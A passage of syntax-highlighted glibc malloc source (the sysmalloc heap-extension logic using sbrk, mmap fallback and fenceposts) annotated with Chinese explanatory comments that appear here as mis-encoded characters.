PREV_INUSE);<br>            <span class="hljs-comment">// è®¾ç½®åŸ top chunk çš„ fencepostï¼Œfencepost éœ€è¦ MINSIZE å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œå°†è¯¥ old_size</span><br>            <span class="hljs-comment">// å‡å» MINSIZE å¾—åˆ°åŸ top chunk çš„æœ‰æ•ˆå†…å­˜ç©ºé—´ï¼Œé¦–å…ˆè®¾ç½® fencepost çš„ç¬¬äºŒä¸ª chunk çš„ size</span><br>            <span class="hljs-comment">// ä¸º 0ï¼Œå¹¶æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ã€‚æ¥ç€åˆ¤æ–­åŸ top chunk çš„æœ‰æ•ˆå†…å­˜ç©ºé—´ä¸Šæ˜¯å¦å¤§</span><br>            <span class="hljs-comment">// äºç­‰äº MINSIZEï¼Œå¦‚æœæ˜¯ï¼Œè¡¨ç¤ºåŸ top chunk å¯ä»¥åˆ†é…å‡ºå¤§äºç­‰äº MINSIZE å¤§å°çš„ chunkï¼Œäº</span><br>            <span class="hljs-comment">// æ˜¯å°†åŸ top chunk åˆ‡åˆ†æˆç©ºé—² chunk å’Œ fencepost ä¸¤éƒ¨åˆ†ï¼Œå…ˆè®¾ç½® fencepost çš„ç¬¬ä¸€ä¸ª chunk</span><br>            <span class="hljs-comment">// çš„å¤§å°ä¸º 2*SIZE_SZï¼Œå¹¶æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ï¼Œfencepost çš„ç¬¬ä¸€ä¸ª chunk è¿˜éœ€</span><br>            <span class="hljs-comment">// è¦è®¾ç½® footï¼Œè¡¨ç¤ºè¯¥ chunk å¤„äºç©ºé—²çŠ¶æ€ï¼Œè€Œ fencepost çš„ç¬¬äºŒä¸ª chunk å´æ ‡è¯†ç¬¬ä¸€ä¸ª chunk</span><br>            <span class="hljs-comment">// å¤„äº inuse çŠ¶æ€ï¼Œå› ä¸ºä¸èƒ½æœ‰ä¸¤ä¸ªç©ºé—² chunk ç›¸é‚»ï¼Œæ‰ä¼šå‡ºç°è¿™ä¹ˆå¥‡æ€ªçš„ fencepostã€‚å¦å¤–å…¶</span><br>            <span class="hljs-comment">// å® top chunk åˆ‡åˆ†å‡ºæ¥çš„ chunk ä¹Ÿæ˜¯å¤„äºç©ºé—²çŠ¶æ€ï¼Œä½† fencepost çš„ç¬¬ä¸€ä¸ª chunk å´æ ‡è¯†å‰ä¸€</span><br>            <span class="hljs-comment">// ä¸ª chunk ä¸º inuse çŠ¶æ€ï¼Œç„¶åå¼ºåˆ¶å°†è¯¥å¤„äº inuse çŠ¶æ€çš„ chunk è°ƒç”¨_int_free()å‡½æ•°é‡Šæ”¾æ‰</span><br>            <span class="hljs-comment">// è¿™æ ·åšå®Œå…¨æ˜¯è¦éµå¾ªä¸èƒ½æœ‰ä¸¤ä¸ªç©ºé—² chunk ç›¸é‚»çš„çº¦å®š</span><br>            <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>            &#123;<br>                set_head (chunk_at_offset(old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                set_foot (chunk_at_offset(old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ));<br>                set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);<br>                _int_free(av, old_top, <span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-comment">// å¦‚æœåŸ top chunk ä¸­æœ‰æ•ˆç©ºé—´ä¸è¶³ MINSIZEï¼Œåˆ™å°†æ•´ä¸ªåŸ top chunk ä½œä¸º fencepostï¼Œ</span><br>            <span class="hljs-comment">// å¹¶è®¾ç½® fencepost çš„ç¬¬ä¸€ä¸ª chunk çš„ç›¸å…³çŠ¶æ€</span><br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                set_head (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                set_foot (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ));<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// å¦‚æœå¢é•¿ sub_heap çš„å¯è¯»å¯å†™åŒºåŸŸå¤§å°å’Œåˆ›å»ºæ–° sub_heap éƒ½å¤±è´¥äº†ï¼Œ</span><br>        <span class="hljs-comment">// å°è¯•ä½¿ç”¨ mmap() å‡½æ•°ç›´æ¥ä»ç³»ç»Ÿåˆ†é…æ‰€éœ€ chunk</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!tried_mmap)<br>            <span class="hljs-comment">/* We can at least try to use to mmap memory.  */</span><br>            <span class="hljs-keyword">goto</span> try_mmap;<br>    &#125; <span class="hljs-keyword">else</span>     <span class="hljs-comment">/* av == main_arena */</span><br>    <span class="hljs-comment">// å¦‚æœå½“å‰åˆ†é…åŒºä¸ºä¸»åˆ†é…åŒº</span><br><br>    &#123; <span class="hljs-comment">/* Request enough space for nb + pad + overhead */</span><br>        size = nb + mp_.top_pad + MINSIZE;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If contiguous, we can subtract out existing space that we hope to</span><br><span class="hljs-comment">           combine with new space. We add it back later only if</span><br><span class="hljs-comment">           we don&#x27;t actually get contiguous space.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸»åˆ†é…åŒºä½¿ç”¨ sbrk()ä» heap ä¸­åˆ†é…å†…å­˜ï¼Œsbrk()è¿”å›è¿ç»­çš„è™šæ‹Ÿå†…å­˜ï¼Œ</span><br>        <span class="hljs-comment">// è¿™é‡Œè°ƒæ•´éœ€è¦åˆ†é…çš„ sizeï¼Œå‡æ‰ top chunk ä¸­å·²æœ‰ç©ºé—²å†…å­˜å¤§å°</span><br>        <span class="hljs-keyword">if</span> (contiguous (av))<br>            size -= old_size;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           Round to a multiple of page size.</span><br><span class="hljs-comment">           If MORECORE is not contiguous, this ensures that we only call it</span><br><span class="hljs-comment">           with whole-page arguments.  And if MORECORE is contiguous and</span><br><span class="hljs-comment">           this is not first time through, this preserves page-alignment of</span><br><span class="hljs-comment">           previous calls. Otherwise, we correct to page-align below.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">//  å°† size æŒ‰ç…§é¡µå¯¹é½ï¼Œsbrk()å¿…é¡»ä»¥é¡µä¸ºå•ä½åˆ†é…è¿ç»­è™šæ‹Ÿå†…å­˜</span><br>        size = ALIGN_UP(size, pagesize);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           Don&#x27;t try to call MORECORE if argument is so big as to appear</span><br><span class="hljs-comment">           negative. Note that since mmap takes size_t arg, it may succeed</span><br><span class="hljs-comment">           below even if we cannot call MORECORE.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// ä½¿ç”¨ sbrk()ä» heap ä¸­åˆ†é… size å¤§å°çš„è™šæ‹Ÿå†…å­˜å—</span><br>        <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>            brk = (<span class="hljs-type">char</span> *) (MORECORE(size));<br>            LIBC_PROBE(memory_sbrk_more, <span class="hljs-number">2</span>, brk, size);<br>        &#125;<br>        <span class="hljs-comment">// å¦‚æœ sbrk()åˆ†é…æˆåŠŸï¼Œå¹¶ä¸” morecore çš„ hook å‡½æ•°å­˜åœ¨ï¼Œè°ƒç”¨ morecore çš„ hook å‡½æ•°</span><br>        <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>            <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span><br>            <span class="hljs-type">void</span> (*hook)(<span class="hljs-type">void</span>) = atomic_forced_read(__after_morecore_hook);<br>            <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>                (*hook)();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">               If have mmap, try using it as a backup when MORECORE fails or</span><br><span class="hljs-comment">               cannot be used. This is worth doing on systems that have &quot;holes&quot; in</span><br><span class="hljs-comment">               address space, so sbrk cannot extend to give contiguous space, but</span><br><span class="hljs-comment">               space is available elsewhere.  Note that we ignore mmap max count</span><br><span class="hljs-comment">               and threshold limits, since the space will not be used as a</span><br><span class="hljs-comment">               segregated mmap region.</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-comment">// å¦‚æœ sbrk()è¿”å›å¤±è´¥ï¼Œæˆ–æ˜¯ sbrk()ä¸å¯ç”¨ï¼Œä½¿ç”¨ mmap()ä»£æ›¿ï¼Œé‡æ–°è®¡ç®—æ‰€éœ€åˆ†é…çš„å†…å­˜</span><br>            <span class="hljs-comment">// å¤§å°å¹¶æŒ‰é¡µå¯¹é½ï¼Œå¦‚æœé‡æ–°è®¡ç®—çš„ size å°äº 1Mï¼Œå°† size è®¾ä¸º 1Mï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨ mmap()</span><br>            <span class="hljs-comment">// ä½œä¸º morecore å‡½æ•°åˆ†é…çš„æœ€å°å†…å­˜å—å¤§å°ä¸º 1M</span><br>            <span class="hljs-comment">/* Cannot merge with old top, so add its size back in */</span><br>            <span class="hljs-keyword">if</span> (contiguous (av))<br>                size = ALIGN_UP(size + old_size, pagesize);<br><br>            <span class="hljs-comment">/* If we are relying on mmap as backup, then use larger units */</span><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (MMAP_AS_MORECORE_SIZE))<br>                size = MMAP_AS_MORECORE_SIZE;<br><br>            <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span><br>            <span class="hljs-comment">// å¦‚æœæ‰€éœ€åˆ†é…çš„å†…å­˜å¤§å°åˆæ³•ï¼Œä½¿ç”¨ mmap()å‡½æ•°åˆ†é…å†…å­˜ã€‚å¦‚æœåˆ†é…æˆåŠŸï¼Œæ›´æ–° brk</span><br>            <span class="hljs-comment">// å’Œ snd_brkï¼Œå¹¶å°†å½“å‰åˆ†é…åŒºå±æ€§è®¾ç½®ä¸ºå¯åˆ†é…ä¸è¿ç»­è™šæ‹Ÿå†…å­˜å—</span><br>              <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)) &#123;<br>                  <span class="hljs-type">char</span> *mbrk = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br><br>                  <span class="hljs-keyword">if</span> (mbrk != MAP_FAILED) &#123;<br>                      <span class="hljs-comment">/* We do not need, and cannot use, another sbrk call to find end */</span><br>                    brk = mbrk;<br>                    snd_brk = brk + size;<br><br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       Record that we no longer have a contiguous sbrk region.</span><br><span class="hljs-comment">                       After the first time mmap is used as backup, we do not</span><br><span class="hljs-comment">                       ever rely on contiguous space since this could incorrectly</span><br><span class="hljs-comment">                       bridge regions.</span><br><span class="hljs-comment">                     */</span><br>                    set_noncontiguous (av);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//å¦‚æœbrkåˆæ³•ï¼Œå³sbrk()æˆ–mmap()åˆ†é…æˆåŠŸï¼Œå¦‚æœsbrk_baseè¿˜æ²¡æœ‰åˆå§‹åŒ–ï¼Œ</span><br>        <span class="hljs-comment">//æ›´æ–° sbrk_base å’Œå½“å‰åˆ†é…åŒºçš„å†…å­˜åˆ†é…æ€»é‡</span><br>        <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>            <span class="hljs-keyword">if</span> (mp_.sbrk_base == <span class="hljs-number">0</span>)<br>                mp_.sbrk_base = brk;<br>            av-&gt;system_mem += size;<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">               If MORECORE extends previous space, we can likewise extend top size.</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-comment">// å¦‚æœ sbrk()åˆ†é…æˆåŠŸï¼Œæ›´æ–° top chunk çš„å¤§å°ï¼Œå¹¶è®¾å®š top chunk çš„å‰ä¸€ä¸ª chunk å¤„äº inuse</span><br>            <span class="hljs-comment">// çŠ¶æ€ã€‚å¦‚æœå½“å‰åˆ†é…åŒºå¯åˆ†é…è¿ç»­è™šæ‹Ÿå†…å­˜ï¼ŒåŸ top chunk çš„å¤§å°å¤§äº 0ï¼Œä½†æ–°çš„ brk å€¼å°</span><br>            <span class="hljs-comment">// äºåŸ top chunk çš„ç»“æŸåœ°å€ï¼Œåˆ™å‡ºé”™äº†</span><br>            <span class="hljs-keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                set_head (old_top, (size + old_size) | PREV_INUSE);<br><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)<br>                <span class="hljs-comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span><br>                malloc_printerr(<span class="hljs-string">&quot;break adjusted to free malloc space&quot;</span>);<br><br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                   Otherwise, make adjustments:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                 * If the first time through or noncontiguous, we need to call sbrk</span><br><span class="hljs-comment">                    just to find out where the end of memory lies.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                 * We need to ensure that all returned chunks from malloc will meet</span><br><span class="hljs-comment">                    MALLOC_ALIGNMENT</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                 * If there was an intervening foreign sbrk, we need to adjust sbrk</span><br><span class="hljs-comment">                    request size to account for fact that we will not be able to</span><br><span class="hljs-comment">                    combine new space with existing space in old_top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                 * Almost all systems internally allocate whole pages at a time, in</span><br><span class="hljs-comment">                    which case we might as well use the whole last page of request.</span><br><span class="hljs-comment">                    So we allocate enough more memory to hit a page boundary now,</span><br><span class="hljs-comment">                    which in turn causes future contiguous calls to page-align.</span><br><span class="hljs-comment">                 */</span><br>            <span class="hljs-comment">// æ‰§è¡Œåˆ°è¿™ä¸ªåˆ†æ”¯ï¼Œæ„å‘³ç€ sbrk()è¿”å›çš„ brk å€¼å¤§äºåŸ top chunk çš„ç»“æŸåœ°å€ï¼Œ</span><br>            <span class="hljs-comment">// é‚£ä¹ˆæ–°çš„åœ°å€ä¸åŸ top chunk çš„åœ°å€ä¸è¿ç»­ï¼Œå¯èƒ½æ˜¯ç”±äºå¤–éƒ¨å…¶å®ƒåœ°æ–¹è°ƒç”¨ sbrk()å‡½æ•°ï¼Œ</span><br>            <span class="hljs-comment">// è¿™é‡Œéœ€è¦å¤„ç†åœ°å€çš„é‡æ–°å¯¹é½é—®é¢˜</span><br>            <span class="hljs-keyword">else</span> &#123;<br><br>                front_misalign = <span class="hljs-number">0</span>;<br>                end_misalign = <span class="hljs-number">0</span>;<br>                correction = <span class="hljs-number">0</span>;<br>                aligned_brk = brk;<br><br>                <span class="hljs-comment">/* handle contiguous cases */</span><br>                <span class="hljs-keyword">if</span> (contiguous (av)) &#123;<br>                    <span class="hljs-comment">/* Count foreign sbrk as system_mem.  */</span><br>                    <span class="hljs-comment">// å¦‚æœæœ¬åˆ†é…åŒºå¯åˆ†é…è¿ç»­è™šæ‹Ÿå†…å­˜ï¼Œå¹¶ä¸”æœ‰å¤–éƒ¨è°ƒç”¨äº† sbrk()å‡½æ•°ï¼Œ</span><br>                    <span class="hljs-comment">// å°†å¤–éƒ¨è°ƒç”¨ sbrk()åˆ†é…çš„å†…å­˜è®¡å…¥å½“å‰åˆ†é…åŒºæ‰€åˆ†é…å†…å­˜ç»Ÿè®¡ä¸­</span><br>                    <span class="hljs-keyword">if</span> (old_size)<br>                        av-&gt;system_mem += brk - old_end;<br><br>                    <span class="hljs-comment">/* Guarantee alignment of first new chunk made from this space */</span><br>                    <span class="hljs-comment">//  è®¡ç®—å½“å‰çš„ brk è¦çŸ«æ­£çš„å­—èŠ‚æ•°æ®ï¼Œä¿è¯ brk åœ°å€æŒ‰ MALLOC_ALIGNMENT å¯¹é½</span><br>                    front_misalign = (INTERNAL_SIZE_T)chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;<br>                    <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-comment">/*</span><br><span class="hljs-comment">                           Skip over some bytes to arrive at an aligned position.</span><br><span class="hljs-comment">                           We don&#x27;t need to specially mark these wasted front bytes.</span><br><span class="hljs-comment">                           They will never be accessed anyway because</span><br><span class="hljs-comment">                           prev_inuse of av-&gt;top (and any chunk created from its start)</span><br><span class="hljs-comment">                           is always true after initialization.</span><br><span class="hljs-comment">                         */</span><br><br>                        correction = MALLOC_ALIGNMENT - front_misalign;<br>                        aligned_brk += correction;<br>                    &#125;<br><br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       If this isn&#x27;t adjacent to existing space, then we will not</span><br><span class="hljs-comment">                       be able to merge with old_top space, so must add to 2nd request.</span><br><span class="hljs-comment">                     */</span><br>                    <span class="hljs-comment">// ç”±äºåŸ top chunk çš„åœ°å€ä¸å½“å‰ brk ä¸ç›¸é‚»ï¼Œä¹Ÿå°±ä¸èƒ½å†ä½¿ç”¨åŸ top chunk çš„å†…å­˜äº†ï¼Œéœ€</span><br>                    <span class="hljs-comment">// è¦é‡æ–°ä¸ºæ‰€éœ€ chunk åˆ†é…è¶³å¤Ÿçš„å†…å­˜ï¼Œå°†åŸ top chunk çš„å¤§å°åŠ åˆ°çŸ«æ­£å€¼ä¸­ï¼Œä»å½“å‰ brk ä¸­</span><br>                    <span class="hljs-comment">// åˆ†é…æ‰€éœ€ chunkï¼Œè®¡ç®—å‡ºæœªå¯¹é½çš„ chunk ç»“æŸåœ°å€ end_misalignï¼Œç„¶åå°† end_misalign æŒ‰ç…§</span><br>                    <span class="hljs-comment">// é¡µå¯¹é½è®¡ç®—å‡ºéœ€è¦çŸ«æ­£çš„å­—èŠ‚æ•°åŠ åˆ°çŸ«æ­£å€¼ä¸Šã€‚ç„¶åå†è°ƒç”¨ sbrk()åˆ†é…çŸ«æ­£å€¼å¤§å°çš„å†…å­˜ï¼Œ</span><br>                    <span class="hljs-comment">// å¦‚æœ sbrk()åˆ†é…æˆåŠŸï¼Œåˆ™å½“å‰çš„ top chunk ä¸­å¯ä»¥åˆ†é…å‡ºæ‰€éœ€çš„è¿ç»­å†…å­˜çš„ chunk</span><br>                    correction += old_size;<br><br>                    <span class="hljs-comment">/* Extend the end address to hit a page boundary */</span><br>                    end_misalign = (INTERNAL_SIZE_T)(brk + size + correction);<br>                    correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;<br><br>                    assert(correction &gt;= <span class="hljs-number">0</span>);<br>                    snd_brk = (<span class="hljs-type">char</span> *) (MORECORE(correction));<br><br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       If can&#x27;t allocate correction, try to at least find out current</span><br><span class="hljs-comment">                       brk.  It might be enough to proceed without failing.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                       Note that if second sbrk did NOT fail, we assume that space</span><br><span class="hljs-comment">                       is contiguous with first sbrk. This is a safe assumption unless</span><br><span class="hljs-comment">                       program is multithreaded but doesn&#x27;t use locks and a foreign sbrk</span><br><span class="hljs-comment">                       occurred between our first and second calls.</span><br><span class="hljs-comment">                     */</span><br>                    <span class="hljs-comment">// å¦‚æœ sbrk()æ‰§è¡Œå¤±è´¥ï¼Œæ›´æ–°å½“å‰ brk çš„ç»“æŸåœ°å€</span><br>                    <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>                        correction = <span class="hljs-number">0</span>;<br>                        snd_brk = (<span class="hljs-type">char</span> *) (MORECORE(<span class="hljs-number">0</span>));<br>                    &#125;<br>                    <span class="hljs-comment">// å¦‚æœ sbrk()æ‰§è¡ŒæˆåŠŸï¼Œå¹¶ä¸”æœ‰ morecore hook å‡½æ•°å­˜åœ¨ï¼Œæ‰§è¡Œè¯¥ hook å‡½æ•°</span><br>                    <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span><br>                        <span class="hljs-type">void</span> (*hook)(<span class="hljs-type">void</span>) = atomic_forced_read(__after_morecore_hook);<br>                        <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>                            (*hook)();<br>                    &#125;<br>                &#125;<br><br>                    <span class="hljs-comment">/* handle non-contiguous cases */</span><br>                <span class="hljs-comment">// æ‰§è¡Œåˆ°è¿™é‡Œï¼Œæ„å‘³ç€ brk æ˜¯ç”¨ mmap()åˆ†é…çš„</span><br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>                        <span class="hljs-comment">/* MORECORE/mmap must correctly align */</span><br>                        assert(((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>                    <span class="hljs-comment">// å¯¹é½æ“ä½œ</span><br>                    <span class="hljs-keyword">else</span> &#123;<br>                        front_misalign = (INTERNAL_SIZE_T)chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;<br>                        <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-comment">/*</span><br><span class="hljs-comment">                               Skip over some bytes to arrive at an aligned position.</span><br><span class="hljs-comment">                               We don&#x27;t need to specially mark these wasted front bytes.</span><br><span class="hljs-comment">                               They will never be accessed anyway because</span><br><span class="hljs-comment">                               prev_inuse of av-&gt;top (and any chunk created from its start)</span><br><span class="hljs-comment">                               is always true after initialization.</span><br><span class="hljs-comment">                             */</span><br><br>                            aligned_brk += MALLOC_ALIGNMENT - front_misalign;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-comment">/* Find out current end of memory */</span><br>                    <span class="hljs-comment">// å¦‚æœ brk çš„ç»“æŸåœ°å€éæ³•ï¼Œä½¿ç”¨ morecore è·å¾—å½“å‰ brk çš„ç»“æŸåœ°å€</span><br>                    <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>                        snd_brk = (<span class="hljs-type">char</span> *) (MORECORE(<span class="hljs-number">0</span>));<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">/* Adjust top based on results of second sbrk */</span><br>                <span class="hljs-comment">// å¦‚æœ brk çš„ç»“æŸåœ°å€åˆæ³•ï¼Œè®¾ç½®å½“å‰åˆ†é…åŒºçš„ top chunk ä¸º brkï¼Œ</span><br>                <span class="hljs-comment">// è®¾ç½® top chunk çš„å¤§å°ï¼Œå¹¶æ›´æ–°åˆ†é…åŒºçš„æ€»åˆ†é…å†…å­˜é‡</span><br>                <span class="hljs-keyword">if</span> (snd_brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>                    av-&gt;top = (mchunkptr) aligned_brk;<br>                    set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);<br>                    av-&gt;system_mem += correction;<br><br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       If not the first time through, we either have a</span><br><span class="hljs-comment">                       gap due to foreign sbrk or a non-contiguous region.  Insert a</span><br><span class="hljs-comment">                       double fencepost at old_top to prevent consolidation with space</span><br><span class="hljs-comment">                       we don&#x27;t own. These fenceposts are artificial chunks that are</span><br><span class="hljs-comment">                       marked as inuse and are in any case too small to use.  We need</span><br><span class="hljs-comment">                       two to make sizes and alignments work out.</span><br><span class="hljs-comment">                     */</span><br>                    <span class="hljs-comment">// è®¾ç½®åŸ top chunk çš„ fencepostï¼Œfencepost éœ€è¦ MINSIZE å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œå°†è¯¥ old_size</span><br>                    <span class="hljs-comment">// å‡å» MINSIZE å¾—åˆ°åŸ top chunk çš„æœ‰æ•ˆå†…å­˜ç©ºé—´ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿¡åŸ top chunk çš„æœ‰æ•ˆå†…å­˜ç©ºé—´</span><br>                    <span class="hljs-comment">// ä¸€å®šå¤§äº MINSIZEï¼Œå°†åŸ top chunk åˆ‡åˆ†æˆç©ºé—² chunk å’Œ fencepost ä¸¤éƒ¨åˆ†ï¼Œé¦–å…ˆè®¾ç½®åˆ‡åˆ†å‡º</span><br>                    <span class="hljs-comment">// æ¥çš„ chunk çš„å¤§å°ä¸º old_sizeï¼Œå¹¶æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ï¼ŒåŸ top chunk åˆ‡åˆ†å‡ºæ¥</span><br>                    <span class="hljs-comment">// çš„chunkæœ¬åº”å¤„äºç©ºé—²çŠ¶æ€ï¼Œä½†fencepostçš„ç¬¬ä¸€ä¸ªchunkå´æ ‡è¯†å‰ä¸€ä¸ªchunkä¸ºinuseçŠ¶æ€ï¼Œ</span><br>                    <span class="hljs-comment">// ç„¶åå¼ºåˆ¶å°†è¯¥å¤„äº inuse çŠ¶æ€çš„ chunk è°ƒç”¨_int_free()å‡½æ•°é‡Šæ”¾æ‰ã€‚ç„¶åè®¾ç½® fencepost çš„ç¬¬</span><br>                    <span class="hljs-comment">// ä¸€ä¸ª chunk çš„å¤§å°ä¸º 2*SIZE_SZï¼Œå¹¶æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ï¼Œç„¶åè®¾ç½® fencepost</span><br>                    <span class="hljs-comment">// çš„ç¬¬äºŒä¸ª chunk çš„ size ä¸º 2*SIZE_SZï¼Œå¹¶æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ã€‚è¿™é‡Œçš„ä¸»åˆ†é…åŒº</span><br>                    <span class="hljs-comment">// çš„ fencepost ä¸éä¸»åˆ†é…åŒºçš„ fencepost ä¸åŒï¼Œä¸»åˆ†é…åŒº fencepost çš„ç¬¬äºŒä¸ª chunk çš„å¤§å°è®¾</span><br>                    <span class="hljs-comment">// ç½®ä¸º 2*SIZE_SZï¼Œè€Œéä¸»åˆ†é…åŒºçš„ fencepost çš„ç¬¬äºŒä¸ª chunk çš„å¤§å°è®¾ç½®ä¸º 0</span><br>                    <span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-comment">/*</span><br><span class="hljs-comment">                           Shrink old_top to insert fenceposts, keeping size a</span><br><span class="hljs-comment">                           multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="hljs-comment">                           enough space in old_top to do this.</span><br><span class="hljs-comment">                         */</span><br>                        old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;<br>                        set_head (old_top, old_size | PREV_INUSE);<br><br>                        <span class="hljs-comment">/*</span><br><span class="hljs-comment">                           Note that the following assignments completely overwrite</span><br><span class="hljs-comment">                           old_top when old_size was previously MINSIZE.  This is</span><br><span class="hljs-comment">                           intentional. We need the fencepost, even if old_top otherwise gets</span><br><span class="hljs-comment">                           lost.</span><br><span class="hljs-comment">                         */</span><br>                        set_head (chunk_at_offset(old_top, old_size),<br>                                  (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                        set_head (chunk_at_offset(old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ),<br>                                  (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br><br>                        <span class="hljs-comment">/* If possible, release the rest. */</span><br>                        <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>                        &#123;<br>                            _int_free(av, old_top, <span class="hljs-number">1</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-comment">/* if (av !=  &amp;main_arena) */</span><br>    <span class="hljs-comment">// å¦‚æœå½“å‰åˆ†é…åŒºæ‰€åˆ†é…çš„å†…å­˜é‡å¤§äºè®¾ç½®çš„æœ€å¤§å€¼ï¼Œæ›´æ–°å½“å‰åˆ†é…åŒºæœ€å¤§åˆ†é…çš„å†…å­˜é‡</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) av-&gt;system_mem &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (av-&gt;max_system_mem))<br>        av-&gt;max_system_mem = av-&gt;system_mem;<br>    check_malloc_state (av);<br><br>    <span class="hljs-comment">/* finally, do the allocation */</span><br>    p = av-&gt;top;<br>    size = chunksize (p);<br><br>    <span class="hljs-comment">/* check that one of the above allocation paths succeeded */</span><br>    <span class="hljs-comment">// å¦‚æœå½“å‰ top chunk ä¸­å·²ç»æœ‰è¶³å¤Ÿçš„å†…å­˜æ¥åˆ†é…æ‰€éœ€çš„ chunkï¼Œ</span><br>    <span class="hljs-comment">// ä»å½“å‰çš„ top chunk ä¸­åˆ†é…æ‰€éœ€çš„ chunk å¹¶è¿”å›</span><br>    <span 